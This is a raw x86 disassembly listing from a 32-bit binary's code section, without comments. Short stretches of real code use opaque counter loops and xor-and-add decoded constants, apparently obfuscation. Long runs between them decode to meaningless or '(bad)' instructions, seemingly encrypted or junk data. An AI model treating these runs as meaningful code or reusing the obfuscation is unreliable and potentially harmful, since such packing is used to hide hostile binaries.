  40e383:	mov    DWORD PTR ds:0x433783,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433783,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433817,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433783,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43382f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4338ab
  40e3da:	and    DWORD PTR ds:0x43378b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4337e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433893
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	add    ah,BYTE PTR es:[ecx+esi*1+0x16]
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e471
  40e421:	adc    BYTE PTR [ecx],dh
  40e423:	test   al,0x94
  40e425:	push   0x7245b58f
  40e42a:	push   0xab7c15b4
  40e42f:	jns    0x40e3ca
  40e431:	xchg   edi,eax
  40e432:	and    bh,BYTE PTR [eax]
  40e434:	dec    ebp
  40e435:	push   ds
  40e436:	bswap  esi
  40e438:	xor    BYTE PTR [edx+0x4a50c759],dl
  40e43e:	cs xor al,0x74
  40e441:	cmp    al,BYTE PTR [esi-0x7d]
  40e444:	mov    ebx,0x9a73e182
  40e449:	(bad)  
  40e44b:	mov    al,BYTE PTR ds:0xb9bec8cd
  40e451:	les    ebp,FWORD PTR [edi+0x4464507d]
  40e457:	pusha  
  40e458:	add    dh,dl
  40e45a:	loop   0x40e485
  40e45c:	sbb    al,0xe1
  40e45e:	fucomi st,st(4)
  40e460:	arpl   WORD PTR [esi],bp
  40e462:	fucomip st,st(6)
  40e464:	adc    BYTE PTR [edi-0x16702480],ch
  40e46a:	jnp    0x40e440
  40e46c:	sahf   
  40e46d:	push   eax
  40e46e:	fistp  WORD PTR [edi-0x5e776552]
  40e474:	sti    
  40e475:	jmp    0xcb63:0xd37a9fba
  40e47c:	pop    esi
  40e47d:	fs in  eax,0x5
  40e480:	sub    eax,0x178a7072
  40e485:	mov    ds:0x9b58e22c,eax
  40e48a:	mov    esi,0x35052769
  40e48f:	sub    edx,DWORD PTR [edx]
  40e491:	add    eax,0x2dd4de2d
  40e496:	pop    ecx
  40e497:	jns    0x40e42e
  40e499:	mov    esp,0xd93c3ec8
  40e49e:	aad    0x5
  40e4a0:	test   DWORD PTR ds:0xbc9bbfcb,eax
  40e4a6:	push   0x66
  40e4a8:	cs aam 0x2c
  40e4ab:	dec    edx
  40e4ac:	scas   al,BYTE PTR es:[edi]
  40e4ad:	ret    
  40e4ae:	in     eax,0xd4
  40e4b0:	jp     0x40e50e
  40e4b2:	xor    BYTE PTR [eax+0x16],ch
  40e4b5:	and    edi,DWORD PTR [eax-0x7b]
  40e4b8:	or     al,0xe0
  40e4ba:	retf   
  40e4bb:	adc    cl,BYTE PTR [ebp-0x4b6e5303]
  40e4c1:	mov    bh,0xc2
  40e4c3:	xchg   esi,eax
  40e4c4:	repnz or eax,DWORD PTR [esi+esi*1-0x2b27bfbe]
  40e4cc:	mov    eax,0x152a528a
  40e4d1:	or     bl,BYTE PTR [ecx]
  40e4d3:	test   al,0x5
  40e4d5:	retf   
  40e4d6:	fcmovnb st,st(6)
  40e4d8:	xor    eax,0x3f6f4b28
  40e4dd:	outs   dx,DWORD PTR ds:[esi]
  40e4de:	fcomp  QWORD PTR ds:0xf0e2c320
  40e4e4:	in     eax,0x93
  40e4e6:	ja     0x40e50b
  40e4e8:	dec    edi
  40e4e9:	addr16 fcmovnu st,st(3)
  40e4ec:	rcl    BYTE PTR [ecx-0x6b428a8],0x8
  40e4f3:	pop    eax
  40e4f4:	pop    ds
  40e4f5:	lahf   
  40e4f6:	fidiv  WORD PTR ds:0xd1ab01f1
  40e4fc:	stos   DWORD PTR es:[edi],eax
  40e4fd:	jmp    0xe286d42e
  40e502:	push   ecx
  40e503:	or     edx,ecx
  40e505:	(bad)  [ebx]
  40e507:	dec    edi
  40e508:	ins    BYTE PTR es:[edi],dx
  40e509:	fnstenv [ebx+0xf]
  40e50c:	and    bh,cl
  40e50e:	test   eax,0x9e0e2bf4
  40e513:	std    
  40e514:	stos   BYTE PTR es:[edi],al
  40e515:	adc    DWORD PTR [ebp+0x7ef5c5b3],esi
  40e51b:	inc    eax
  40e51c:	pop    ss
  40e51d:	xor    DWORD PTR [ebx],0x2f
  40e520:	jg     0x40e56d
  40e522:	ds jo  0x40e503
  40e525:	dec    esp
  40e526:	in     al,0x0
  40e528:	inc    BYTE PTR [esi+0x5d7163e8]
  40e52e:	add    ch,BYTE PTR [edi]
  40e530:	pushf  
  40e531:	out    0x78,al
  40e533:	cmp    eax,0x7e3cf906
  40e538:	popf   
  40e539:	cmc    
  40e53a:	push   esi
  40e53b:	xor    cl,BYTE PTR [ebx+0xd81f445]
  40e541:	and    edi,DWORD PTR [eax]
  40e543:	inc    ebx
  40e544:	add    BYTE PTR [ebx+0x38],ch
  40e547:	inc    ebx
  40e548:	add    BYTE PTR [ebx],dh
  40e54a:	mov    BYTE PTR [ebx],0xc3
  40e54d:	sbb    DWORD PTR ds:0x43385b,0x43382f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x37f261b8
  40e5b4:	cld    
  40e5b5:	adc    bh,al
  40e5b7:	sub    bl,BYTE PTR [ecx+0x7f127e7e]
  40e5bd:	jle    0x40e63d
  40e5bf:	xchg   ebx,eax
  40e5c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5c1:	sub    dh,BYTE PTR [ebx+eiz*8-0x66]
  40e5c5:	push   ebx
  40e5c6:	outs   dx,BYTE PTR ds:[esi]
  40e5c7:	push   ecx
  40e5c8:	es gs xchg edi,eax
  40e5cb:	cmp    al,0x7f
  40e5cd:	inc    ebx
  40e5ce:	or     esi,esp
  40e5d0:	adc    DWORD PTR [esi+0x51],edi
  40e5d3:	ret    
  40e5d4:	sbb    eax,0x23846f41
  40e5d9:	add    BYTE PTR [esi+0x48712b70],0x18
  40e5e0:	push   ds
  40e5e1:	shl    DWORD PTR [eax-0x3],cl
  40e5e4:	jmp    0x40e5b8
  40e5e6:	enter  0x13e5,0x42
  40e5ea:	mov    dh,al
  40e5ec:	cmp    eax,DWORD PTR [ebp-0x60]
  40e5ef:	fadd   QWORD PTR [esi-0x5d]
  40e5f2:	(bad)  
  40e5f4:	cmc    
  40e5f5:	jle    0x40e60c
  40e5f7:	mov    dh,dh
  40e5f9:	je     0x40e5f7
  40e5fb:	loope  0x40e5c7
  40e5fd:	jmp    0x7e60:0xaa49ed10
  40e604:	xlat   BYTE PTR ds:[ebx]
  40e605:	jo     0x40e58a
  40e607:	data16 add ah,BYTE PTR [eax+0x25b81c2c]
  40e60e:	xchg   ebx,eax
  40e60f:	mov    esi,0x6e2fcb7e
  40e614:	dec    esp
  40e615:	sar    BYTE PTR [esi+0xc],0xf0
  40e619:	lods   eax,DWORD PTR ds:[esi]
  40e61a:	push   ebp
  40e61b:	pop    esp
  40e61c:	std    
  40e61d:	xchg   ebx,eax
  40e61e:	mov    cl,0x4b
  40e620:	xchg   ebp,eax
  40e621:	imul   edi,DWORD PTR [eax+eax*2+0x21fd88ca],0x254fe19
  40e62c:	pop    ds
  40e62d:	outs   dx,BYTE PTR ds:[esi]
  40e62e:	xor    DWORD PTR [ecx+0x798d280b],ebp
  40e634:	or     BYTE PTR [ebp+0x4016add0],dh
  40e63a:	outs   dx,DWORD PTR ds:[esi]
  40e63c:	sub    eax,DWORD PTR [edi+0x17]
  40e63f:	jmp    0x40e6a0
  40e641:	fwait
  40e642:	sbb    al,0x16
  40e644:	dec    eax
  40e645:	xor    ecx,DWORD PTR [ecx-0x6d9404ac]
  40e64b:	adc    eax,0x8713fe83
  40e650:	xchg   edx,eax
  40e651:	adc    DWORD PTR [edi-0x72e0e444],0xd9c4b4d1
  40e65b:	xchg   esi,eax
  40e65c:	fucom  st(4)
  40e65e:	mov    ah,0x5e
  40e660:	(bad)
  40e664:	jl     0x40e67d
  40e666:	(bad)  
  40e667:	out    0x83,al
  40e669:	pop    esi
  40e66a:	inc    esp
  40e66b:	mov    bl,0x6a
  40e66d:	popf   
  40e66e:	out    0xb8,al
  40e670:	call   0xd1eff1e3
  40e675:	pop    edx
  40e676:	jo     0x40e621
  40e678:	xor    eax,0xb359797c
  40e67d:	es push es
  40e67f:	jl     0x40e698
  40e681:	lods   al,BYTE PTR ds:[esi]
  40e682:	cs dec ebp
  40e684:	push   edx
  40e685:	(bad)  
  40e687:	jmp    0xe56d:0xa208f5d3
  40e68e:	bound  ecx,QWORD PTR [ebx+0x3f]
  40e691:	jmp    0x40e6df
  40e693:	ss pushw ds
  40e696:	jno    0x40e676
  40e698:	and    DWORD PTR ds:0x5ebeaf22,ebx
  40e69e:	daa    
  40e69f:	xor    BYTE PTR [ebx+0x41d7597f],0xb3
  40e6a6:	popa   
  40e6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6a8:	in     al,dx
  40e6a9:	adc    dl,BYTE PTR [edi-0x4315fd2c]
  40e6af:	jo     0x40e6d9
  40e6b1:	fcmovnu st,st(7)
  40e6b3:	or     BYTE PTR [ebx+0x77],dl
  40e6b6:	iret   
  40e6b7:	ds pop ecx
  40e6b9:	xchg   ebp,eax
  40e6ba:	push   es
  40e6bb:	and    eax,0xfcfa02ec
  40e6c0:	pop    es
  40e6c1:	xlat   BYTE PTR ds:[ebx]
  40e6c2:	xlat   BYTE PTR ds:[ebx]
  40e6c3:	ins    DWORD PTR es:[edi],dx
  40e6c4:	push   eax
  40e6c5:	cmp    BYTE PTR [ebx-0x65ff033a],al
  40e6cb:	mov    bh,0xa9
  40e6cd:	or     BYTE PTR [esi-0x49],dl
  40e6d0:	dec    ebx
  40e6d1:	mov    dl,0x7
  40e6d3:	and    al,0xfd
  40e6d5:	and    al,0xb3
  40e6d7:	outs   dx,BYTE PTR ds:[esi]
  40e6d8:	fstp   QWORD PTR [edx+0x3b34a1c5]
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0x3f8f23]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6a4
  40e704:	in     eax,0xbf
  40e706:	mov    esp,DWORD PTR [edx+0x1572a664]
  40e70c:	(bad)  
  40e70d:	cmc    
  40e70e:	pushf  
  40e70f:	sub    eax,0x3d4c719f
  40e714:	lahf   
  40e715:	mov    ah,0xdc
  40e717:	mov    ebp,esp
  40e719:	xchg   edi,eax
  40e71a:	aam    0x3d
  40e71c:	popa   
  40e71d:	(bad)  
  40e71e:	mov    bh,BYTE PTR [edi+0x663bc234]
  40e724:	(bad)  
  40e725:	cli    
  40e726:	cwde   
  40e727:	ja     0x40e78c
  40e729:	mov    dh,0x9
  40e72b:	pop    esi
  40e72c:	ss out 0xfb,al
  40e72f:	mov    ecx,0xef093531
  40e734:	mov    DWORD PTR [edi-0x53],esi
  40e737:	cmp    BYTE PTR [ebx+0x58],dl
  40e73a:	and    eax,0x682542b8
  40e73f:	jo     0x40e72f
  40e741:	sti    
  40e742:	cwde   
  40e743:	lods   al,BYTE PTR ds:[esi]
  40e744:	push   ss
  40e745:	rol    esp,0x37
  40e748:	data16 and ch,dh
  40e74b:	mov    ebp,0x849593d0
  40e750:	ror    DWORD PTR [ecx+0x507a6b51],0x0
  40e757:	out    dx,al
  40e758:	jmp    0x40e73f
  40e75a:	pop    esp
  40e75b:	fdivr  QWORD PTR [edx]
  40e75d:	push   0xc90fe7d1
  40e762:	in     al,0x4f
  40e764:	dec    eax
  40e765:	inc    esp
  40e766:	pop    es
  40e767:	rcl    bl,0xb2
  40e76a:	sub    ch,ah
  40e76c:	cmp    eax,DWORD PTR [edx]
  40e76e:	mov    ah,0xe9
  40e770:	stc    
  40e771:	xor    eax,0xc1481ec3
  40e776:	fiadd  DWORD PTR [edx+0x74]
  40e779:	push   ebp
  40e77a:	fist   DWORD PTR [ebx]
  40e77c:	push   edi
  40e77d:	push   ds
  40e77e:	cli    
  40e77f:	mov    bh,BYTE PTR [ebx]
  40e781:	inc    esi
  40e782:	dec    eax
  40e783:	jnp    0x40e78f
  40e785:	pop    ds
  40e786:	pop    ebp
  40e787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e788:	mov    DWORD PTR [edx],0x6f567d30
  40e78e:	aaa    
  40e78f:	and    eax,0xe89f46b7
  40e794:	sub    eax,0x3875d6f6
  40e799:	push   esi
  40e79a:	ficomp WORD PTR [eax]
  40e79c:	ja     0x40e781
  40e79e:	or     edi,DWORD PTR [edi]
  40e7a0:	inc    edi
  40e7a1:	push   0x859e9f12
  40e7a6:	push   edi
  40e7a7:	adc    dl,BYTE PTR [ebp-0x59c5e765]
  40e7ad:	dec    ebp
  40e7ae:	sub    al,al
  40e7b0:	jmp    DWORD PTR [ebp-0x3a26a121]
  40e7b6:	dec    esp
  40e7b7:	xor    al,0xf0
  40e7b9:	imul   edi,DWORD PTR [edx+0xd],0x39
  40e7bd:	fcmovne st,st(7)
  40e7bf:	cmp    BYTE PTR [edx],bl
  40e7c1:	stos   BYTE PTR es:[edi],al
  40e7c2:	pop    esp
  40e7c3:	dec    ebp
  40e7c4:	mov    ch,0xf8
  40e7c6:	movaps xmm7,XMMWORD PTR [eax]
  40e7c9:	in     al,dx
  40e7ca:	mov    dh,0xa
  40e7cc:	(bad)  
  40e7cd:	lds    ebp,FWORD PTR [ecx-0x74]
  40e7d0:	div    ch
  40e7d2:	(bad)  
  40e7d3:	in     eax,0x18
  40e7d5:	xor    BYTE PTR [ebx+0x29ae7b97],cl
  40e7db:	or     esp,DWORD PTR [edx+ecx*2+0x38]
  40e7df:	sub    al,0x42
  40e7e1:	sub    eax,DWORD PTR [ecx+0x72]
  40e7e4:	sbb    ch,ah
  40e7e6:	lods   eax,DWORD PTR ds:[esi]
  40e7e7:	sbb    eax,0x4963afc5
  40e7ec:	add    edi,DWORD PTR [esi-0x384e0847]
  40e7f2:	sub    eax,0xff76b7a5
  40e7f7:	cmp    esi,esi
  40e7f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7fa:	or     eax,0x2359aa9c
  40e7ff:	imul   eax,ebx,0x25
  40e802:	inc    ebp
  40e803:	xor    eax,0xfb69dd6c
  40e808:	gs cmp si,sp
  40e80c:	sbb    DWORD PTR [eax-0x36],eax
  40e80f:	inc    ebp
  40e810:	aas    
  40e811:	and    edx,DWORD PTR [ebx-0x52a6ff1a]
  40e817:	push   edi
  40e818:	(bad)  
  40e819:	out    dx,al
  40e81a:	cmp    DWORD PTR [ebp-0x7648da49],ebp
  40e820:	inc    ebp
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e82a
  40e854:	xchg   ecx,eax
  40e855:	loope  0x40e866
  40e857:	loop   0x40e800
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8ab
  40e860:	sbb    ah,BYTE PTR [edx+0x65]
  40e863:	ficom  DWORD PTR [eax+0x7d]
  40e866:	fcomp  st(2)
  40e868:	jb     0x40e883
  40e86a:	sub    dl,bh
  40e86c:	or     bl,BYTE PTR ds:0xa19bad2f
  40e872:	jmp    0x40e8e5
  40e874:	jb     0x40e804
  40e876:	das    
  40e877:	add    esi,ebx
  40e879:	push   ds
  40e87a:	xchg   edx,eax
  40e87b:	pusha  
  40e87c:	icebp  
  40e87d:	dec    ebp
  40e87e:	call   0xbd23de87
  40e883:	add    cl,BYTE PTR [edi+0x71]
  40e886:	dec    edi
  40e887:	dec    edx
  40e888:	out    dx,al
  40e889:	aaa    
  40e88a:	pop    ebx
  40e88b:	hlt    
  40e88c:	stos   DWORD PTR es:[edi],eax
  40e88d:	ins    DWORD PTR es:[edi],dx
  40e88e:	mov    eax,ds:0xe52605c
  40e893:	int    0xc1
  40e895:	adc    esp,edi
  40e897:	dec    edi
  40e898:	test   DWORD PTR [ebx-0x43],0x15fec31
  40e89f:	mov    al,ds:0x39a403bf
  40e8a4:	or     BYTE PTR [ebx-0x664fe438],0x9b
  40e8ab:	sub    eax,0xbec7c868
  40e8b0:	or     ebx,0x2d4cf717
  40e8b6:	sti    
  40e8b7:	xchg   ebx,eax
  40e8b8:	mov    edi,0xe652cc73
  40e8bd:	mov    WORD PTR [eax+ecx*8-0x65cdbab7],fs
  40e8c4:	xchg   ecx,eax
  40e8c5:	loope  0x40e896
  40e8c7:	js     0x40e8aa
  40e8c9:	mov    ecx,0x53067f35
  40e8ce:	je     0x40e8d5
  40e8d0:	pusha  
  40e8d1:	push   eax
  40e8d2:	pop    eax
  40e8d3:	sub    cl,BYTE PTR [ebx-0x47]
  40e8d6:	sbb    ebx,DWORD PTR [edx+0x75a79470]
  40e8dc:	rcl    DWORD PTR [ebp-0x6e],0x37
  40e8e0:	and    BYTE PTR [bp+si-0x4e],dh
  40e8e4:	call   FWORD PTR [edx-0x140074ca]
  40e8ea:	cwde   
  40e8eb:	adc    ebx,DWORD PTR [eax-0x761f766c]
  40e8f1:	jp     0x40e8c1
  40e8f3:	in     eax,dx
  40e8f4:	in     al,0x8
  40e8f6:	mov    bl,0xc8
  40e8f8:	cdq    
  40e8f9:	pop    esp
  40e8fa:	inc    edi
  40e8fb:	mov    ecx,0x54388404
  40e900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e901:	dec    ecx
  40e902:	gs xor al,al
  40e905:	mov    ds:0xec91854a,al
  40e90a:	lock adc edx,DWORD PTR [esi+0x2]
  40e90e:	inc    esi
  40e90f:	cmc    
  40e910:	xor    BYTE PTR [ebp+0x61],ch
  40e913:	dec    bh
  40e915:	aas    
  40e916:	jg     0x40e91d
  40e918:	jno    0x40e985
  40e91a:	lds    edi,FWORD PTR [ecx]
  40e91c:	sbb    ah,BYTE PTR [ebx-0x16136472]
  40e922:	push   ebx
  40e923:	add    cl,BYTE PTR [eax-0x8db4f3c]
  40e929:	xor    eax,0x3888279b
  40e92e:	stos   DWORD PTR es:[edi],eax
  40e92f:	dec    edx
  40e930:	gs mov esi,ebp
  40e933:	jle    0x40e95f
  40e935:	(bad)  
  40e936:	sahf   
  40e937:	cmp    bl,BYTE PTR [edi+edx*2+0x6b]
  40e93b:	in     eax,dx
  40e93c:	and    DWORD PTR ds:0xc5be379a,edi
  40e942:	jo     0x40e90e
  40e944:	fbld   TBYTE PTR [edx]
  40e946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e947:	(bad)  
  40e948:	push   ebx
  40e949:	xlat   BYTE PTR ds:[ebx]
  40e94a:	push   esi
  40e94b:	pop    es
  40e94c:	es out 0xdf,eax
  40e94f:	ins    DWORD PTR es:[edi],dx
  40e950:	pop    esi
  40e951:	mov    ebx,DWORD PTR [ebx-0x11766166]
  40e957:	pop    ebp
  40e958:	xchg   DWORD PTR [esi+ecx*1+0x47],ebx
  40e95c:	lods   al,BYTE PTR ds:[esi]
  40e95d:	popf   
  40e95e:	pop    ebp
  40e95f:	jnp    0x40e982
  40e961:	mov    ch,0x2d
  40e963:	mov    ds:0x68acdcae,al
  40e968:	pop    ebx
  40e969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e96a:	push   ss
  40e96b:	adc    eax,0xe193aa41
  40e970:	sub    BYTE PTR [esi+0x14b12098],ah
  40e976:	dec    esi
  40e977:	push   ds
  40e978:	(bad)  
  40e979:	pusha  
  40e97a:	adc    eax,0xf93e850f
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xdaab7e1d
  40e99c:	loop   0x40e924
  40e99e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e99f:	jle    0x40ea1f
  40e9a1:	adc    bh,BYTE PTR [edi+0x7e]
  40e9a4:	jle    0x40ea17
  40e9a6:	outs   dx,DWORD PTR ds:[esi]
  40e9a7:	pop    edx
  40e9a8:	cli    
  40e9a9:	adc    eax,0xb4f14f48
  40e9ae:	sbb    al,0x9
  40e9b0:	sub    BYTE PTR [eax+0x348ea783],dh
  40e9b6:	sbb    dh,BYTE PTR [edx+edi*2-0x5a5dd205]
  40e9bd:	push   eax
  40e9be:	out    0xc0,eax
  40e9c0:	and    bh,ch
  40e9c2:	(bad)  
  40e9c3:	popa   
  40e9c4:	(bad)  
  40e9c5:	mov    ds:0x5a85c49f,al
  40e9ca:	in     eax,dx
  40e9cb:	mov    eax,edi
  40e9cd:	addr16 xchg esp,eax
  40e9cf:	daa    
  40e9d0:	pop    ss
  40e9d1:	dec    ecx
  40e9d2:	out    0x6b,al
  40e9d4:	ins    BYTE PTR es:[edi],dx
  40e9d5:	aam    0xc1
  40e9d7:	add    edx,edx
  40e9d9:	popa   
  40e9da:	mov    DWORD PTR [ebp-0x61],ebx
  40e9dd:	push   ebx
  40e9de:	mov    ebp,0x7cedfdea
  40e9e3:	lahf   
  40e9e4:	es push ebp
  40e9e6:	fmul   DWORD PTR [edi-0x1c]
  40e9e9:	dec    esp
  40e9ea:	in     eax,dx
  40e9eb:	push   0x8
  40e9ed:	push   eax
  40e9ee:	cmp    al,0xa3
  40e9f0:	sub    eax,0x5e0b96af
  40e9f5:	stc    
  40e9f6:	ds cmp eax,0x27fd9a29
  40e9fc:	mov    ecx,0xb9ee6798
  40ea01:	cdq    
  40ea02:	sti    
  40ea03:	xchg   ecx,eax
  40ea04:	in     eax,0x25
  40ea06:	out    0x5e,al
  40ea08:	inc    ebx
  40ea09:	sub    DWORD PTR [edi+0x4b9b19e2],edx
  40ea0f:	fs and al,0xdd
  40ea12:	cwde   
  40ea13:	mov    WORD PTR [esi],cs
  40ea15:	js     0x40ea68
  40ea17:	data16 jb 0x40ea72
  40ea1a:	dec    edx
  40ea1b:	dec    esp
  40ea1c:	out    dx,al
  40ea1d:	mov    ah,0x78
  40ea1f:	ins    DWORD PTR es:[edi],dx
  40ea20:	pop    edx
  40ea21:	cmp    eax,0x9301ab22
  40ea26:	cmp    eax,0x220324ff
  40ea2b:	push   ebx
  40ea2c:	xchg   ecx,eax
  40ea2d:	test   DWORD PTR [ecx-0x17],0xd6ebbc6f
  40ea34:	arpl   WORD PTR [edi+0x20576c2f],si
  40ea3a:	enter  0x5e09,0x31
  40ea3e:	(bad)  
  40ea3f:	nop
  40ea40:	pop    ebx
  40ea41:	test   BYTE PTR [esi+0x1b],0x4d
  40ea45:	cld    
  40ea46:	mov    ds:0xb7d53e9b,eax
  40ea4b:	(bad)  
  40ea4c:	rol    DWORD PTR [eax+0x1b07d6fa],cl
  40ea52:	xor    al,0xb7
  40ea54:	or     al,0x70
  40ea56:	aaa    
  40ea57:	aad    0x15
  40ea59:	mov    al,ds:0xf7e44107
  40ea5e:	jge    0x40e9e5
  40ea60:	cmp    DWORD PTR [eax-0x5696fa85],esi
  40ea66:	popa   
  40ea67:	cmp    BYTE PTR [eax-0x56ce55aa],dh
  40ea6d:	adc    edi,DWORD PTR [ebp+0x16]
  40ea70:	cs out dx,eax
  40ea72:	pop    es
  40ea73:	sub    ebp,esi
  40ea75:	mov    al,ds:0x1b5c2819
  40ea7a:	add    ch,BYTE PTR [esi]
  40ea7c:	xor    bh,al
  40ea7e:	mov    edi,0x5971f391
  40ea83:	outs   dx,DWORD PTR ds:[esi]
  40ea84:	pusha  
  40ea85:	push   0xd912720
  40ea8a:	clc    
  40ea8b:	pop    ebx
  40ea8c:	das    
  40ea8d:	in     al,dx
  40ea8e:	xor    dh,BYTE PTR [esp+edi*2]
  40ea91:	imul   ebp,DWORD PTR [edi+eax*4+0x42],0x12bf9be5
  40ea99:	jb     0x40ea1b
  40ea9b:	shl    BYTE PTR [ecx-0x28],1
  40ea9e:	test   BYTE PTR [edx],0x87
  40eaa1:	in     eax,dx
  40eaa2:	rcr    DWORD PTR [edi+esi*1+0x27e0ec51],0xc1
  40eaaa:	mov    esi,0x81b7648
  40eaaf:	mov    DWORD PTR [edx-0x7e],0x5155b3b2
  40eab6:	call   0x4cc1a7e3
  40eabb:	pushf  
  40eabc:	push   ebp
  40eabd:	(bad)  
  40eabe:	pop    ecx
  40eabf:	mov    ebx,0x5bc30349
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433813,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433813,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433813,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433813,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433813
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433813,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433813
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433813,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433853,0x16
  40eb34:	cmp    DWORD PTR ds:0x433853,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433853,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433853
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433853,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x433863,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43381b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4338ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    dh,BYTE PTR [eax+eiz*1+0x5]
  40ebb6:	pushf  
